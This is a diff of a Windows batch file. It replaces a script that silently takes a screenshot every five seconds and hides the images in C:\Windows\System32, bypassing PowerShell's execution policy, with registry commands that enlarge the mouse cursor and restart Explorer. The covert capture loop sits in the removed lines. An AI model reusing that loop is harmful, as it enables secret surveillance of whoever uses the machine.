@@ -1,41 +1,7 @@
 @echo off
-:: Set the folder where screenshots will be saved
-set SCREENSHOT_DIR=C:\Windows\System32
-
-:: Create the folder if it doesn't exist
-if not exist "%SCREENSHOT_DIR%" mkdir "%SCREENSHOT_DIR%"
-
-:: Set the interval (in seconds) between screenshots
-set INTERVAL=5
-
-:: Infinite loop to continuously take screenshots
-:LOOP
-    :: Call PowerShell to take a screenshot
-    powershell -ExecutionPolicy Bypass -Command ^
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Drawing;
-    using System.Windows.Forms;
-    public class Screenshot
-    {
-        public static void CaptureScreen(string filePath)
-        {
-            Rectangle bounds = Screen.PrimaryScreen.Bounds;
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
-            {
-                using (Graphics g = Graphics.FromImage(bitmap))
-                {
-                    g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
-                    bitmap.Save(filePath);
-                }
-            }
-        }
-    }
-    "@; ^
-    [Screenshot]::CaptureScreen('%SCREENSHOT_DIR%\screenshot_' + (Get-Date -Format 'yyyyMMdd_HHmmss') + '.png')
-
-    :: Wait for the specified interval before taking the next screenshot
-    timeout /t %INTERVAL% > nul
-
-    :: Go back to the LOOP to keep taking screenshots
-    goto LOOP
+:: Change mouse cursor size to large (100% DPI increase)
+reg add "HKCU\Control Panel\Cursors" /v "CursorBaseSize" /t REG_DWORD /d 48 /f
+reg add "HKCU\Control Panel\Cursors" /v "Arrow" /t REG_SZ /d "large_arrow.cur" /f
+:: Restart Explorer to apply changes
+taskkill /f /im explorer.exe
+start explorer.exe
